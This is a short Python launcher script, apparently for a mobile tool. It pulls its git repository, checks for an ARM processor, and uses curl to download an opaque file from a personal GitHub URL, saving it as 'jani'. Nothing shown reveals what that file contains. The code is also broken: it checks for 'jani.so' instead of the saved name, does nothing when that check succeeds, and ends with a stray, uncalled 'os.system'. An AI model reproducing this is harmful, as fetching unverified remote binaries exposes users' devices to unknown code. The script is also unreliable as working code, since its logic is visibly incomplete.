import os
os.system('git pull')
from os import path,system
from platform import uname
bt=uname().machine.lower()
if 'aarch' in bt:
    url = "https://raw.githubusercontent.com/DaniMalik1/free/main/Hiss.txt"
    system("curl -L "+url+" -o jani")
    if path.isfile("jani.so"):
        pass
    
else:exit('\033[1;31m\n Sorry System or 32bit device not supported ')
os.system
 
